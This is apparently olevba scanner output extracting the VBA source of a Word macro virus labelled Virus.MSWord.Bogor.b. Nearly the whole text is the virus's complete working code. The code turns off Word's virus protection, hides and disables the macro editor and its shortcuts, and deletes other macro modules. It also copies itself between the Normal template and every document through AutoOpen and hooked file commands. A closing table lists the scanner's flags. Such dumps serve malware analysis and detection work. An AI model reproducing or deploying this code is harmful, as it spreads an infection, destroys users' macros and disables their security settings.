olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bogor.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bogor.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO IPBBogor.bas 
in file: Virus.MSWord.Bogor.b - OLE stream: 'Macros/VBA/IPBBogor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
Attribute CyInit.VB_Description = "Bogor Agriculture University"
Attribute CyInit.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.CyInit"
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan

    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Attribute CyClose.VB_Description = "Bogor Agriculture University"
Attribute CyClose.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.CyClose"
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
Attribute Dok2Nor.VB_Description = "Bogor Agriculture University"
Attribute Dok2Nor.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.Dok2Nor"
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "IPBBogor" Then Norok = True
      If (NMacr <> "IPBBogor") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=NT.FullName, Name:= _
          "IPBBogor", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
Attribute Nor2Dok.VB_Description = "Bogor Agriculture University"
Attribute Nor2Dok.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.Nor2Dok"
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To Ad.VBProject.VBComponents.Count
      NMacr = Ad.VBProject.VBComponents(i).Name
      If NMacr = "IPBBogor" Then Dokok = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "IPBBogor" Then Dokok = True
      If (NMacr <> "IPBBogor") And (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=Ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=Ad.FullName, Name:= _
          "IPBBogor", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
Attribute Cyber.VB_Description = "Bogor Agriculture University"
Attribute Cyber.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.Cyber"
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
Attribute Tahan.VB_Description = "Bogor Agriculture University"
Attribute Tahan.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.Tahan"
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = True
    End With
End Sub
Sub Simpan()
Attribute Simpan.VB_Description = "Bogor Agriculture University"
Attribute Simpan.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.Simpan"
    On Error GoTo Erh4
Set Ad = ActiveDocument
    If DokSave = 1 Then
       Ad.SaveAs FileName:=Ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Bogor Agriculture University"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.AutoOpen"
    Call Cyber
End Sub
Sub FileClose()
Attribute FileClose.VB_Description = "Bogor Agriculture University"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.FileClose"
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.FileClose
End Sub
Sub FileOpen()
Attribute FileOpen.VB_Description = "Bogor Agriculture University"
Attribute FileOpen.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.FileOpen"
    Call Cyber
    Dialogs(wdDialogFileOpen).Show
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Bogor Agriculture University"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.FileSaveAs"
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
Attribute FileSave.VB_Description = "Bogor Agriculture University"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.FileSave"
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
Attribute HelpAbout.VB_Description = "Bogor Agriculture University"
Attribute HelpAbout.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.HelpAbout"
    On Error GoTo Erw3
    MsgBox "Reformasi, YES!", 48
    Help wdHelpAbout
Erw3:
End Sub
Sub FileExit()
Attribute FileExit.VB_Description = "Bogor Agriculture University"
Attribute FileExit.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.FileExit"
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
Attribute ToolsOptions.VB_Description = "Bogor Agriculture University"
Attribute ToolsOptions.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.ToolsOptions"
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
Attribute FileNew.VB_Description = "Bogor Agriculture University"
Attribute FileNew.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.FileNew"
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_Description = "Bogor Agriculture University"
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.FileTemplates"
    Call Cyber
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Bogor Agriculture University"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.ToolsMacro"
    Call Cyber
End Sub
Sub ToolsCustomize()
Attribute ToolsCustomize.VB_Description = "Bogor Agriculture University"
Attribute ToolsCustomize.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.ToolsCustomize"
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
Attribute ToolsCustomizeKeyboard.VB_Description = "Bogor Agriculture University"
Attribute ToolsCustomizeKeyboard.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.ToolsCustomizeKeyboard"
    Call Cyber
End Sub
Sub ViewVBCode()
Attribute ViewVBCode.VB_Description = "Bogor Agriculture University"
Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.ViewVBCode"
    Call Cyber
End Sub
Sub Organizer()
Attribute Organizer.VB_Description = "Bogor Agriculture University"
Attribute Organizer.VB_ProcData.VB_Invoke_Func = "Normal.IPBBogor.Organizer"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

